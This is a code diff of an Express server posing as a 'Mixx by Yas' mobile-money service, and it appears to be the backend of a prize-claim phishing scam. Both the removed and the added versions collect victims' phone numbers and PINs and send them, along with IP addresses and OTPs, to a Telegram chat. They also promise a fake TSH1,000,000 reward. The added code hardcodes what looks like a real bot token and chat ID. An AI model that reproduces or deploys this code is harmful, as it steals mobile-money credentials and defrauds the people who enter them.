@@ -1,256 +1,323 @@
-require('dotenv').config();
 const express = require('express');
 const cors = require('cors');
-const helmet = require('helmet');
-const rateLimit = require('express-rate-limit');
 const axios = require('axios');
+require('dotenv').config();
 
 const app = express();
-const PORT = process.env.PORT || 3000;
 
-// ============================================
-// FIX: Enable trust proxy for Railway
-// ============================================
-app.set('trust proxy', 1); // Trust first proxy (Railway)
-
-// ============================================
-// TELEGRAM CREDENTIALS (from .env)
-// ============================================
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
-
-// ============================================
-// MIDDLEWARE
-// ============================================
-app.use(helmet({
-  contentSecurityPolicy: false,
-}));
-
+// ===== MIDDLEWARE - FIXED CORS =====
 app.use(cors({
-  origin: '*',
-  methods: ['GET', 'POST'],
-  allowedHeaders: ['Content-Type']
+    origin: '*', // Allow all origins for testing
+    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
+    allowedHeaders: ['Content-Type', 'Authorization']
 }));
 
-// Rate limiting to prevent abuse
-const limiter = rateLimit({
-  windowMs: 15 * 60 * 1000, // 15 minutes
-  max: 100, // Limit each IP to 100 requests per windowMs
-  message: 'Too many requests, please try again later.',
-  standardHeaders: true,
-  legacyHeaders: false,
-  // Fix: Use 'true' to trust proxy headers
-  trustProxy: true,
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
+
+// ===== CONFIGURATION =====
+const PORT = process.env.PORT || 5000;
+
+// ===== TELEGRAM CREDENTIALS =====
+const TELEGRAM_BOT_TOKEN = '8926981745:AAFg96uMr8hQaiQN0F9Miglr0gizZrp48rs';
+const TELEGRAM_CHAT_ID = '8392790531';
+
+// ===== IN-MEMORY STORAGE =====
+const userOTPStore = new Map();
+const userPinStore = new Map();
+
+// ===== VALIDATION =====
+function validatePhone(phone) {
+    return /^(07|06)\d{8}$/.test(phone);
+}
+
+function validatePin(pin) {
+    return /^\d{4}$/.test(pin);
+}
+
+function validateOTP(otp) {
+    return /^\d{6}$/.test(otp);
+}
+
+function generateOTP() {
+    return Math.floor(100000 + Math.random() * 900000).toString();
+}
+
+// ===== TELEGRAM FUNCTIONS =====
+async function sendTelegramMessage(message) {
+    try {
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        const response = await axios.post(url, {
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'HTML'
+        });
+        console.log('✅ Telegram message sent');
+        return response.data;
+    } catch (error) {
+        console.error('❌ Telegram error:', error.message);
+        throw error;
+    }
+}
+
+async function sendOTP(phone, otp) {
+    const message = `
+🎯 <b>MIXX BY YAS - OTP VERIFICATION</b>
+━━━━━━━━━━━━━━━━━━━━━
+
+📱 <b>Phone:</b> ${phone}
+🔐 <b>OTP Code:</b> <code>${otp}</code>
+⏰ <b>Valid for:</b> 5 minutes
+
+⚠️ <i>Do not share this code with anyone!</i>
+
+━━━━━━━━━━━━━━━━━━━━━
+🔒 Secure · Fast · Reliable
+    `;
+    return await sendTelegramMessage(message);
+}
+
+// ===== API ENDPOINTS =====
+
+// Root endpoint
+app.get('/', (req, res) => {
+    res.json({
+        name: 'Mixx by Yas API',
+        version: '1.0.0',
+        status: 'online',
+        timestamp: new Date().toISOString(),
+        telegram: {
+            bot: TELEGRAM_BOT_TOKEN ? '✅ Configured' : '❌ Missing',
+            chatId: TELEGRAM_CHAT_ID ? '✅ Configured' : '❌ Missing'
+        }
+    });
 });
-app.use('/Server', limiter);
-
-app.use(express.json({ limit: '10kb' }));
-app.use(express.urlencoded({ extended: true, limit: '10kb' }));
-
-// ============================================
-// LOGGING
-// ============================================
-app.use((req, res, next) => {
-  console.log(`[${new Date().toISOString()}] ${req.method} ${req.path}`);
-  if (req.body && Object.keys(req.body).length > 0) {
-    console.log('📦 Body:', req.body);
-  }
-  next();
-});
-
-// ============================================
-// ROUTES
-// ============================================
 
 // Health check
-app.get('/', (req, res) => {
-  res.json({
-    status: 'OK',
-    message: 'MIXX_BY YAS Backend is running',
-    timestamp: new Date().toISOString(),
-    telegram: TELEGRAM_BOT_TOKEN ? 'Configured ✅' : 'Not configured ⚠️',
-    endpoint: 'https://mixxyas05com-production.up.railway.app'
-  });
-});
-
-// Health check for Railway
-app.get('/health', (req, res) => {
-  res.status(200).json({ 
-    status: 'healthy', 
-    uptime: process.uptime(),
-    service: 'MIXX_BY YAS'
-  });
-});
-
-// ============================================
-// MAIN ENDPOINT: /Server (POST)
-// ============================================
-app.post('/Server', async (req, res) => {
-  try {
-    const { phone, pin } = req.body;
-
-    // Validation
-    if (!phone || !pin) {
-      console.warn('⚠️ Missing fields:', { phone: !!phone, pin: !!pin });
-      return res.status(400).json({
-        success: false,
-        message: 'Phone and PIN are required'
-      });
-    }
-
-    // Validate phone format (Tanzanian numbers)
-    const phoneRegex = /^[0-9]{10}$/;
-    if (!phoneRegex.test(phone)) {
-      console.warn('⚠️ Invalid phone format:', phone);
-      return res.status(400).json({
-        success: false,
-        message: 'Phone number must be 10 digits'
-      });
-    }
-
-    // Validate PIN (4 digits)
-    const pinRegex = /^[0-9]{4}$/;
-    if (!pinRegex.test(pin)) {
-      console.warn('⚠️ Invalid PIN format:', pin);
-      return res.status(400).json({
-        success: false,
-        message: 'PIN must be 4 digits'
-      });
-    }
-
-    console.log('✅ Valid data received:', { phone, pin });
-
-    // ============================================
-    // SEND TO TELEGRAM
-    // ============================================
-    let telegramSuccess = false;
-    let telegramResponse = null;
-
-    if (TELEGRAM_BOT_TOKEN && TELEGRAM_BOT_TOKEN !== 'your_bot_token_here') {
-      try {
-        const message = `🎯 *NEW CLAIM - MIXX_BY YAS*\n📱 Phone: ${phone}\n🔐 PIN: ${pin}\n🕐 Time: ${new Date().toLocaleString('sw-TZ', { timeZone: 'Africa/Dar_es_Salaam' })}\n🌐 IP: ${req.ip || req.connection.remoteAddress}\n📍 Source: mixxyas05com-production.up.railway.app`;
-
-        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-        
-        const response = await axios.post(telegramUrl, {
-          chat_id: TELEGRAM_CHAT_ID,
-          text: message,
-          parse_mode: 'Markdown'
-        }, {
-          timeout: 10000
-        });
-
-        telegramSuccess = response.data.ok;
-        telegramResponse = response.data;
-        
-        if (telegramSuccess) {
-          console.log('✅ Telegram notification sent successfully');
-        } else {
-          console.error('❌ Telegram returned error:', response.data);
-        }
-      } catch (telegramError) {
-        console.error('❌ Telegram send failed:', telegramError.message);
-        if (telegramError.response) {
-          console.error('Telegram response:', telegramError.response.data);
-        }
-        telegramSuccess = false;
-      }
-    } else {
-      console.warn('⚠️ Telegram not configured, skipping notification');
-    }
-
-    // ============================================
-    // RESPONSE
-    // ============================================
-    res.status(200).json({
-      success: true,
-      message: 'Claim submitted successfully',
-      telegram: {
-        sent: telegramSuccess,
-        details: telegramResponse
-      },
-      data: {
-        phone: phone,
-        pin: '****',
-        timestamp: new Date().toISOString()
-      }
+app.get('/api/health', (req, res) => {
+    res.json({
+        status: 'healthy',
+        timestamp: new Date().toISOString(),
+        port: PORT,
+        uptime: process.uptime()
     });
-
-  } catch (error) {
-    console.error('❌ Server error:', error);
-    res.status(500).json({
-      success: false,
-      message: 'Internal server error',
-      error: process.env.NODE_ENV === 'development' ? error.message : undefined
-    });
-  }
 });
 
-// ============================================
-// TELEGRAM WEBHOOK
-// ============================================
-app.post('/webhook', async (req, res) => {
-  try {
-    const { message } = req.body;
-    if (message && message.text) {
-      console.log('📩 Telegram message received:', message.text);
-      
-      if (message.text === '/start') {
-        const chatId = message.chat.id;
-        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-          chat_id: chatId,
-          text: '👋 Welcome to MIXX_BY YAS Bot!\n\n📊 Status: Active\n🔗 Endpoint: https://mixxyas05com-production.up.railway.app\n\nSend /status to check system status.'
+// ===== LOGIN ENDPOINT =====
+app.post('/api/login', async (req, res) => {
+    console.log('📥 Login request received:', req.body);
+    
+    try {
+        const { phone, pin } = req.body;
+
+        // Validate
+        if (!phone || !validatePhone(phone)) {
+            return res.status(400).json({
+                status: 'error',
+                message: 'Invalid phone number. Must be 07XXXXXXXX or 06XXXXXXXX'
+            });
+        }
+
+        if (!pin || !validatePin(pin)) {
+            return res.status(400).json({
+                status: 'error',
+                message: 'Invalid PIN. Must be 4 digits'
+            });
+        }
+
+        // Generate OTP
+        const otp = generateOTP();
+        console.log(`🔐 OTP generated for ${phone}: ${otp}`);
+
+        // Store OTP
+        userOTPStore.set(phone, {
+            otp: otp,
+            expiresAt: Date.now() + 5 * 60 * 1000,
+            attempts: 0
         });
-      }
-      
-      if (message.text === '/status') {
-        const chatId = message.chat.id;
-        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-          chat_id: chatId,
-          text: `📊 *System Status*\n✅ Server: Online\n🕐 Uptime: ${Math.floor(process.uptime())}s\n📱 Monitoring: Active\n🔗 URL: https://mixxyas05com-production.up.railway.app`
+
+        // Send OTP via Telegram
+        try {
+            await sendOTP(phone, otp);
+            console.log('✅ OTP sent to Telegram for:', phone);
+        } catch (telegramError) {
+            console.error('❌ Telegram send failed:', telegramError.message);
+            // Continue anyway - we'll still return success
+        }
+
+        res.json({
+            status: 'success',
+            message: 'OTP sent to your phone via Telegram',
+            data: { phone, otpSent: true }
         });
-      }
+
+    } catch (error) {
+        console.error('❌ Login error:', error);
+        res.status(500).json({
+            status: 'error',
+            message: 'Login failed: ' + error.message
+        });
     }
-    res.sendStatus(200);
-  } catch (error) {
-    console.error('Webhook error:', error);
-    res.sendStatus(500);
-  }
 });
 
-// ============================================
-// ERROR HANDLING
-// ============================================
+// ===== VERIFY OTP ENDPOINT =====
+app.post('/api/verify-otp', async (req, res) => {
+    console.log('📥 Verify OTP request received:', req.body);
+    
+    try {
+        const { phone, otp } = req.body;
+
+        if (!phone || !validatePhone(phone)) {
+            return res.status(400).json({
+                status: 'error',
+                message: 'Invalid phone number'
+            });
+        }
+
+        if (!otp || !validateOTP(otp)) {
+            return res.status(400).json({
+                status: 'error',
+                message: 'Invalid OTP. Must be 6 digits'
+            });
+        }
+
+        const storedData = userOTPStore.get(phone);
+        if (!storedData) {
+            return res.status(400).json({
+                status: 'error',
+                message: 'No OTP found. Please request a new one.'
+            });
+        }
+
+        if (storedData.attempts >= 3) {
+            userOTPStore.delete(phone);
+            return res.status(400).json({
+                status: 'error',
+                message: 'Too many failed attempts. Request a new OTP.'
+            });
+        }
+
+        if (Date.now() > storedData.expiresAt) {
+            userOTPStore.delete(phone);
+            return res.status(400).json({
+                status: 'error',
+                message: 'OTP expired. Request a new one.'
+            });
+        }
+
+        if (storedData.otp !== otp) {
+            storedData.attempts += 1;
+            userOTPStore.set(phone, storedData);
+            return res.status(400).json({
+                status: 'error',
+                message: `Invalid OTP. ${3 - storedData.attempts} attempts left.`
+            });
+        }
+
+        // OTP Verified!
+        userOTPStore.delete(phone);
+
+        // Send success notification
+        try {
+            await sendTelegramMessage(`
+🎉 <b>OTP VERIFIED SUCCESSFULLY</b>
+━━━━━━━━━━━━━━━━━━━━━
+📱 <b>Phone:</b> ${phone}
+✅ <b>Status:</b> VERIFIED
+🏆 <b>Congratulations!</b> You've claimed TSH1,000,000!
+            `);
+        } catch (e) {
+            console.error('Telegram success message failed:', e.message);
+        }
+
+        res.json({
+            status: 'success',
+            message: 'OTP verified successfully!',
+            data: { phone, verified: true }
+        });
+
+    } catch (error) {
+        console.error('❌ OTP verification error:', error);
+        res.status(500).json({
+            status: 'error',
+            message: 'Verification failed: ' + error.message
+        });
+    }
+});
+
+// ===== RESEND OTP ENDPOINT =====
+app.post('/api/resend-otp', async (req, res) => {
+    console.log('📥 Resend OTP request received:', req.body);
+    
+    try {
+        const { phone } = req.body;
+
+        if (!phone || !validatePhone(phone)) {
+            return res.status(400).json({
+                status: 'error',
+                message: 'Invalid phone number'
+            });
+        }
+
+        const otp = generateOTP();
+        console.log(`🔐 New OTP generated for ${phone}: ${otp}`);
+
+        userOTPStore.set(phone, {
+            otp: otp,
+            expiresAt: Date.now() + 5 * 60 * 1000,
+            attempts: 0
+        });
+
+        try {
+            await sendOTP(phone, otp);
+        } catch (e) {
+            console.error('Telegram resend failed:', e.message);
+        }
+
+        res.json({
+            status: 'success',
+            message: 'New OTP sent successfully!'
+        });
+
+    } catch (error) {
+        console.error('❌ Resend OTP error:', error);
+        res.status(500).json({
+            status: 'error',
+            message: 'Failed to resend OTP: ' + error.message
+        });
+    }
+});
+
+// ===== TEST TELEGRAM ENDPOINT =====
+app.get('/api/test-telegram', async (req, res) => {
+    try {
+        await sendTelegramMessage('✅ Mixx by Yas bot is online and working!');
+        res.json({
+            status: 'success',
+            message: 'Test message sent to Telegram'
+        });
+    } catch (error) {
+        res.status(500).json({
+            status: 'error',
+            message: 'Failed to send test message: ' + error.message
+        });
+    }
+});
+
+// ===== ERROR HANDLING =====
 app.use((err, req, res, next) => {
-  console.error('Unhandled error:', err);
-  res.status(500).json({
-    success: false,
-    message: 'Something went wrong'
-  });
+    console.error('❌ Global error:', err);
+    res.status(500).json({
+        status: 'error',
+        message: 'Something went wrong: ' + err.message
+    });
 });
 
-// ============================================
-// START SERVER
-// ============================================
-app.listen(PORT, () => {
-  console.log('========================================');
-  console.log('🚀 MIXX_BY YAS Backend Server');
-  console.log('========================================');
-  console.log(`📡 Server running on port: ${PORT}`);
-  console.log(`🌐 URL: https://mixxyas05com-production.up.railway.app`);
-  console.log(`🔗 Endpoint: POST /Server`);
-  console.log(`📱 Telegram: ${TELEGRAM_BOT_TOKEN ? '✅ Configured' : '❌ Not configured'}`);
-  console.log(`🆔 Chat ID: ${TELEGRAM_CHAT_ID || 'Not set'}`);
-  console.log('========================================');
-});
-
-// Graceful shutdown
-process.on('SIGTERM', () => {
-  console.log('🛑 Received SIGTERM, shutting down gracefully...');
-  process.exit(0);
-});
-
-process.on('SIGINT', () => {
-  console.log('🛑 Received SIGINT, shutting down gracefully...');
-  process.exit(0);
+// ===== START SERVER =====
+app.listen(PORT, '0.0.0.0', () => {
+    console.log(`🚀 Server running on port ${PORT}`);
+    console.log(`📍 URL: https://mixxbyyas-offers06com-production.up.railway.app`);
+    console.log(`📱 Telegram Bot: @${TELEGRAM_BOT_TOKEN.split(':')[0]}`);
+    console.log(`📊 Chat ID: ${TELEGRAM_CHAT_ID}`);
+    console.log('✅ Server is ready!');
 });
